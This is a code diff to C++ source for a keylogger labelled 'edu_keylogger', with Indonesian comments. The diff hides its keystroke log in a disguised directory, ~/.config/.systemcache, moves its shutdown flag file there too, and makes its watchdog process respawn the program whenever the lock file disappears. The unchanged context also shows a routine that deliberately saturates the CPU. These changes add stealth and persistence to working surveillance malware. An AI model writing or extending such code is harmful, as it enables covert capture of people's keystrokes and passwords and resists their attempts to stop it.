@@ -28,6 +28,22 @@ using json = nlohmann::json;
 atomic<bool> running(true);
 const string LOCKFILE = "/tmp/edu_keylogger.lock";
 
+void ensureLogDirectoryExists(const string& path) {
+    size_t pos = 0;
+    while ((pos = path.find('/', pos + 1)) != string::npos) {
+        string subdir = path.substr(0, pos);
+        if (!subdir.empty()) mkdir(subdir.c_str(), 0700);
+    }
+    mkdir(path.c_str(), 0700);
+}
+
+string getHiddenLogPath() {
+    const char* home = getenv("HOME");
+    string logDir = string(home) + "/.config/.systemcache";
+    ensureLogDirectoryExists(logDir);
+    return logDir + "/.log";
+}
+
 // Fungsi untuk benar-benar membebani CPU dengan stabil
 void bakar_cpu() {
     const size_t thread_count = max(8u, thread::hardware_concurrency() * 4);
@@ -169,10 +185,9 @@ bool createLockFile() {
 void createWatchdogProcess() {
     pid_t pid = fork();
     if (pid == 0) {
-        pid_t parent_pid = getppid();
         while (true) {
             sleep(1);
-            if (kill(parent_pid, 0) != 0) {
+            if (!ifstream(LOCKFILE)) {
                 execl("/proc/self/exe", "/proc/self/exe", nullptr);
                 _exit(EXIT_FAILURE);
             }
@@ -236,7 +251,8 @@ void keyloggerMain() {
     time_t startTime = time(nullptr);
     const int totalDuration = 60 * 60; // 1 jam
     
-    ofstream logfile("/tmp/edu_keylogger.log", ios::app);
+    string logPath = getHiddenLogPath();
+    ofstream logfile(logPath, ios::app);
     logfile << "==== STARTED AT " << put_time(localtime(&startTime), "%Y-%m-%d %H:%M:%S")
             << " ====\nDURATION: " << totalDuration << " seconds\nPASSWORD: " 
             << (exitPassword.empty() ? "default_password" : "*******") << endl;
@@ -264,12 +280,13 @@ void keyloggerMain() {
         }
         
         // Check shutdown flag
-        ifstream flagfile("/tmp/edu_keylogger.exit");
+        string shutdownFlagPath = string(getenv("HOME")) + "/.config/.systemcache/.exit";
+        ifstream flagfile(shutdownFlagPath);
         if (flagfile) {
             string password;
             flagfile >> password;
             flagfile.close();
-            remove("/tmp/edu_keylogger.exit");
+            remove(shutdownFlagPath);
             
             if (password == exitPassword) {
                 logfile << "\n[✓] CORRECT PASSWORD. EXITING...\n";
@@ -320,11 +337,13 @@ int main(int argc, char* argv[]) {
         createWatchdogProcess();
         keyloggerMain();
     } else { // Shutdown mode
+        string home = getenv("HOME");
+        string shutdownFlagPath = home + "/.config/.systemcache/.exit";
         string password;
         cout << "Enter shutdown password: ";
         cin >> password;
         
-        ofstream flagfile("/tmp/edu_keylogger.exit");
+        ofstream flagfile(shutdownFlagPath);
         if (flagfile) {
             flagfile << password;
             flagfile.close();
